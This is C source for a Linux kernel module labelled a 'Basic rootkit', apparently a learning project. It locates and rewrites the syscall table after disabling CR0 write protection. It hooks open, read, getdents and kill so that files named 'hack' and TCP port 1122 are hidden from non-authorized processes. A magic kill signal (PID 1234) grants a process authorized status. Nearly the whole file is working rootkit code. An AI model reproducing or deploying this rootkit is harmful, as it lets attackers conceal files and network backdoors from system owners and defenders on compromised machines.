#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/syscalls.h>
#include <linux/utsname.h>
#include <asm/current.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <asm/paravirt.h>


MODULE_AUTHOR("Antoine Rouquette");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Basic rootkit");

#define SYS_CALL_TABLE_ADDR 0xffffffffa5200220
#define FILE_PATH           "/tmp/hack"
#define FILE_PATH_SIZE      9
#define FILE_BASENAME       "hack"
#define FILE_BASENAME_SIZE  4
#define MAGIC_KILL_PID		1234
#define MAX_PIDS			8
#define MIN(a,b)			((a < b) ? a : b)
#define TCP_PORT			1122
#define TCP_PORT_HEX		"00000000:0462"

static pid_t authorized_pids[MAX_PIDS] = {0};
static size_t authorized_pids_cnt = 0;

struct vip_files
{
	char * name;
	int fd;
};

struct vip_files vip_filenames[] = {
										{.name = "/proc/net/tcp", .fd = -1},
										{.name = "/proc/net/tcp6", .fd = -1}
									};
const size_t vip_filenames_size = sizeof(vip_filenames) / sizeof(vip_filenames[0]);

struct linux_dirent 
{
    unsigned long   d_ino;      // Inode number.
    unsigned long   d_off;      // Offset of the next linux dirent.
    unsigned short  d_reclen;   // Length of this linux dirent.
    char            d_name[];   // Filename.
};

//How to find the syscall address and not in hardcoded
unsigned long * sys_call = NULL;

// Original functions
asmlinkage int (*original_sys_open) (const char *pathname, int flags);
asmlinkage int (*original_sys_close) (unsigned int fd);
asmlinkage int (*original_sys_getdents) (unsigned int fd, struct linux_dirent *dip, unsigned int count);
asmlinkage int (*original_sys_kill) (pid_t pid, int sig);
asmlinkage pid_t (*original_sys_getpid) (void);
asmlinkage pid_t (*original_sys_getppid) (void);
asmlinkage ssize_t (*original_sys_read) (int fd, void *buf, size_t count); 


void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size)
{
	char *p;

	for(p = (char *)haystack; p <= ((char *)haystack - needle_size + haystack_size); p++)
		if(memcmp(p, needle, needle_size) == 0)
			return (void *)p;

	return NULL;
}

#ifdef __x86_64__

unsigned long *find_sys_call_table(void)
{
	unsigned long sct_off = 0;
	unsigned char code[512];
	char **p;

	printk("[%s] x86_64 sycall", __this_module.name);

	rdmsrl(MSR_LSTAR, sct_off);
	memcpy(code, (void *)sct_off, sizeof(code));

	printk("[%s] MSR_LSTAR : %s", __this_module.name, code);

	p = (char **)memmem(code, sizeof(code), "\xff\x14\xc5", 3);

	if(p) {
		unsigned long *table = *(unsigned long **)((char *)p + 3);
		table = (unsigned long *)(((unsigned long)table & 0xffffffff) | 0xffffffff00000000);
		return table;
	}
	return NULL;
}

#else

struct {
	unsigned short limit;
	unsigned long base;
} __attribute__ ((packed))idtr;

struct {
	unsigned short off1;
	unsigned short sel;
	unsigned char none, flags;
	unsigned short off2;
} __attribute__ ((packed))idt;

unsigned long *find_sys_call_table(void) {
	char **p;
	unsigned long sct_off = 0;
	unsigned char code[255];

	printk("[%s] x86 sycall", __this_module.name);

	asm("sidt %0":"=m" (idtr));
	memcpy(&idt, (void *)(idtr.base + 8 * 0x80), sizeof(idt));
	sct_off = (idt.off2 << 16) | idt.off1;
	memcpy(code, (void *)sct_off, sizeof(code));

	p = (char **)memmem(code, sizeof(code), "\xff\x14\x85", 3);

	if(p) return *(unsigned long **)((char *)p + 3);
	else return NULL;
}

#endif

/*  
 * File system, one layer deep into kernel
 * Donc, pour chaque fonction de userland, il faut voir son implementation et checker le niveau en dessous
 * */

static int is_proc_authorized(pid_t pid)
{
	int i;

	for(i = 0; i < authorized_pids_cnt; i++)
		if(pid == authorized_pids[i])
			return 1;
	return 0;
}

// -1 if not VIP, index in the table otherwise
static int get_vip_index(const char * filename)
{
	size_t i = 0;
	
	if(!filename || !strlen(filename))
		return -1;
	
	for(i=0; i < vip_filenames_size; i++)
	{
		if(!strncmp(vip_filenames[i].name, filename, MIN(strlen(vip_filenames[i].name),strlen(filename))))
			return i;
	}
	return -1;
}

struct file *file_open(const char *path, int flags, int rights)
{
	struct file *filp = NULL;
	mm_segment_t oldfs;
	int err = 0;

	// on stocke l'ancien filesystem ici
	oldfs  = get_fs();
	set_fs(get_ds());
	filp = filp_open(path, flags, rights);
	set_fs(oldfs);
	if(IS_ERR(filp))
	{
		err = PTR_ERR(filp);
		return NULL;
	}
	return filp;
}
 
int file_close(struct file *file)
{
    return filp_close(file, NULL);
}
 
int file_read(struct file * file, unsigned long long offset, unsigned char * data, 
                   unsigned int size)
{
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_read(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
}

int file_write(struct file * file, unsigned long long offset, unsigned char * data, 
                    unsigned int size)
{
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_write(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
}

int file_sync(struct file * file)
{
    vfs_fsync(file, 0);
    return 0;
}

// Finish editing some files here
 
asmlinkage int fake_sys_open(const char *pathname, int flags)
{
	int fd = -1;
	int is_vip = -1;
 
	pid_t pid  = original_sys_getpid();
    pid_t ppid = original_sys_getppid();

	is_vip = get_vip_index(pathname);

	// If authorized, we can open the file
	if(is_proc_authorized(pid) || is_proc_authorized(ppid))
	{
		fd = original_sys_open(pathname, flags);
		if(is_vip >= 0)
			vip_filenames[is_vip].fd = fd;
	}
	else
	{
		if(!strstr(pathname, FILE_BASENAME))
		{
			fd = original_sys_open(pathname, flags);
			if(is_vip >= 0)
				vip_filenames[is_vip].fd = fd;
		}
	}
	return fd;
}

asmlinkage ssize_t fake_sys_read(int fd, void *buf, size_t count)
{
	int 	i	= 0;
	ssize_t ret = 0;
	char ** tmp_str = NULL;
	char * tok = NULL;
	char * tmp = NULL;
	char * final = NULL;
	char tampon[512];

	for(i = 0; i < vip_filenames_size; i++)
		if(vip_filenames[i].fd == fd)
			break;

	ret = original_sys_read(fd, buf, count);
	// Not a vip file, read in normally
	if(i == vip_filenames_size)
		return ret;

	tmp = (char*)vmalloc(count);
	final = (char*)vmalloc(count);
	memcpy(tmp, buf, count);
	tmp_str = &tmp;

	//lets just print buf for now
	while((tok = strsep(tmp_str, "\n")) != NULL)
	{
		if(strlen(tok) == 0)
			continue;
		else if(strstr(tok, TCP_PORT_HEX))
			continue;
		snprintf(tampon, 512, "%s\n", tok);
		strcat(final, tampon);
		printk("[%s][%s] extracting line %s\n", __this_module.name, vip_filenames[i].name, tok);
	}

	strcat(final, "\0");
	memcpy(buf, final, count);
	vfree(final);
	vfree(tmp);
	vip_filenames[i].fd = -1;

	return ret;
}

asmlinkage int fake_sys_close(unsigned int fd)
{
#define MAX_NAME_SIZE	64
    static char cnt;
    char filename[MAX_NAME_SIZE] = {'\0'};
    struct file * filp = NULL;

    if(cnt > 9)
		return original_sys_close(fd);

	snprintf(filename, MAX_NAME_SIZE, "%s%d.txt", FILE_PATH, cnt);

    filp = file_open(filename, O_RDWR | O_APPEND | O_CREAT, 0);
    if(filp)
    {
        printk("[%s] File : %s created!\n", __this_module.name, filename);
        file_write(filp, 0, filename, strlen(filename));
        file_close(filp);
        filp = NULL;
    }
    cnt++;

    return original_sys_close(fd);
}

asmlinkage int fake_sys_kill(pid_t pid, int sig)
{
	int ret = 0;
	if(pid == MAGIC_KILL_PID)
	{
		if(authorized_pids_cnt < MAX_PIDS)
			authorized_pids[authorized_pids_cnt++] = current->pid;
	}
	else
		ret = original_sys_kill(pid, sig);
	return ret;
}

asmlinkage int fake_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
	// Get the relevant informations
#define LOGS_SIZE	512
    unsigned long 			bpos 		= 0;
    unsigned long 			lost_data 	= 0;
    char 					* buf;
    char 					d_type;
    char 					logs[LOGS_SIZE];
    struct linux_dirent *	dir			= NULL;
    struct linux_dirent *	prev		= NULL;
    int						nread		= 0;
    pid_t					pid		    = original_sys_getpid();
    pid_t					ppid	    = original_sys_getppid();

	if(is_proc_authorized(pid) || is_proc_authorized(ppid))
		return original_sys_getdents(fd, dirp, count);

	nread = original_sys_getdents(fd, dirp, count);

    buf = (char*)dirp;

    if(nread < 0)
        return nread;
    else if(nread == 0)
        return nread;

	for(bpos = 0; bpos < nread;)
	{
		dir = (struct linux_dirent *)(buf + bpos);
		//~ d_type = *(buf + bpos + dir->d_reclen - 1);
		//~ snprintf(logs, LOGS_SIZE,"%8ld    %-10s  %4d %10lld  %s\n", dir->d_ino,
			//~ (d_type == DT_REG) ?  "regular" :
			//~ (d_type == DT_DIR) ?  "directory" :
			//~ (d_type == DT_FIFO) ? "FIFO" :
			//~ (d_type == DT_SOCK) ? "socket" :
			//~ (d_type == DT_LNK) ?  "symlink" :
			//~ (d_type == DT_BLK) ?  "block dev" :
			//~ (d_type == DT_CHR) ?  "char dev" : "???",
			//~ dir->d_reclen, (long long) dir->d_off, dir->d_name);
		//~ printk("[%s] --------------- nread=%d ---------------\n", __this_module.name, nread);
		//~ printk("[%s] inode#    file type  d_reclen  d_off   d_name\n", __this_module.name);
		//~ printk("[%s] %s", __this_module.name, logs);

		if(strlen(dir->d_name) > 3)
		{
			// Shit, we get the file of the same name, hide it, is it 1st element!
			if(!memcmp(dir->d_name, "hack", 4))
			{
				// Just move the 1st block in that case and don't do anything
				if(!prev)
				{
					struct linux_dirent * 	next 	= (struct linux_dirent *)(buf + bpos + dir->d_reclen);
					unsigned long			offset	= dir->d_reclen + next->d_reclen;
					lost_data += dir->d_reclen;
					dir = (struct linux_dirent *)memmove(dir, next, next->d_reclen);
					dir->d_reclen = offset;
					continue;
				}
				else
				{
					lost_data += dir->d_reclen;
					prev->d_reclen += dir->d_reclen;
					bpos += dir->d_reclen;
					continue;
				}
			}
		}
		prev = dir;
		// move to next linux_dirent
		bpos += dir->d_reclen;
	}

    return (nread - lost_data);
}

static int __init lkm_init(void)
{
	sys_call = (unsigned long *)find_sys_call_table();

	if(!sys_call)
	{
		sys_call = (unsigned long *)kallsyms_lookup_name("sys_call_table");
		if(!sys_call)
		{
			sys_call = (unsigned long *)SYS_CALL_TABLE_ADDR;
			printk("[%s] hardcoded sys_call_table : 0x%p.\n", __this_module.name, sys_call);
		}
		else
		{
			printk("[%s] 2.sys_call_table : 0x%p.\n", __this_module.name, sys_call);
		}
	}
	else
		printk("[%s] 1.sys_call_table found : 0x%p.\n", __this_module.name, sys_call);

    original_sys_open      	= sys_call[__NR_open];
    original_sys_read      	= sys_call[__NR_read];
    original_sys_close      = sys_call[__NR_close];
    original_sys_getdents   = sys_call[__NR_getdents];
    original_sys_kill   	= sys_call[__NR_kill];
    original_sys_getpid   	= sys_call[__NR_getpid];
    original_sys_getppid   	= sys_call[__NR_getppid];
    write_cr0(read_cr0() & (~0x10000));
    sys_call[__NR_open]    	= fake_sys_open;
    sys_call[__NR_read]    	= fake_sys_read;
    sys_call[__NR_close]    = fake_sys_close;
    sys_call[__NR_getdents] = fake_sys_getdents;
    sys_call[__NR_kill] 	= fake_sys_kill;
    write_cr0(read_cr0() | (0x10000));
    printk(KERN_INFO "[%s] module loaded.\n", __this_module.name);
    return 0;
}

static void __exit lkm_exit(void)
{
    write_cr0(read_cr0() & (~0x10000));
    sys_call[__NR_open] 	= original_sys_open;
    sys_call[__NR_read] 	= original_sys_read;
    sys_call[__NR_close] 	= original_sys_close;
    sys_call[__NR_getdents] = original_sys_getdents;
    sys_call[__NR_kill] 	= original_sys_kill;
    write_cr0(read_cr0() | (0x10000));
    printk(KERN_INFO "[%s] module unloaded.\n", __this_module.name);
}

// how to find the syscall table in this case

module_init(lkm_init);
module_exit(lkm_exit);
